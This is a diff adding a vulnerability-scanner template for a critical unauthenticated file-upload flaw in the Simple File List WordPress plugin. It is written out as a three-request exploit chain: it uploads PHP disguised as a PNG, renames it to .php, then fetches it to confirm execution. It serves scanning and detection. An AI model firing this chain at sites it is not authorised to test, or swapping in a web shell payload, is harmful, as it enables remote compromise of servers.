@@ -1,0 +1,77 @@
+id: wordpress-rce-simplefilelist
+
+info:
+  name: WordPress SimpleFilelist - Remote Code Execution
+  author: princechaddha
+  severity: critical
+  description: |
+    Simple File List WordPress plugin was found to be vulnerable to an unauthenticated arbitrary file upload leading to remote code execution. The Python exploit first uploads a file containing PHP code but with a png image file extension. A second request is sent to move (rename) the png file to a PHP file.
+  reference:
+    - https://wpscan.com/vulnerability/10192
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 3
+  tags: wp,wpscan,wordpress,wp-plugin,rce,intrusive,fileupload
+variables:
+  filepath: '{{rand_base(7, "abcdefghi")}}'
+
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/simple-file-list/ee-upload-engine.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=6985fa39c0698d07f6d418b37388e1b2
+
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_ID"
+
+        1
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_FileUploadDir"
+
+        /wp-content/uploads/simple-file-list/
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_Timestamp"
+
+        1587258885
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="eeSFL_Token"
+
+        ba288252629a5399759b6fde1e205bc2
+        --6985fa39c0698d07f6d418b37388e1b2
+        Content-Disposition: form-data; name="file"; filename="{{filepath}}.png"
+        Content-Type: image/png
+
+        <?php echo md5("wordpress-rce-simplefilelist"); phpinfo(); ?>
+        --6985fa39c0698d07f6d418b37388e1b2--
+      - |
+        POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+
+        eeSFL_ID=1&eeFileOld={{filepath}}.png&eeListFolder=%2F&eeFileAction=Rename%7C{{filepath}}.php
+      - |
+        GET /wp-content/uploads/simple-file-list/{{filepath}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "aa5be3e9dec96f2f1a593b2f5b2288af"
+          - "PHP Version"
+          - "Configuration Command"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a0047304502210088879930bf5b174bea66061e2d725fb2e206648d3a8f13f3a36b8f10ca64be7b022069e37edf7eff0d66f5ce9627d277362b44bf27f57aeda0c3127303d0466a8b8d:922c64590222798bb761d5b6d8e72950
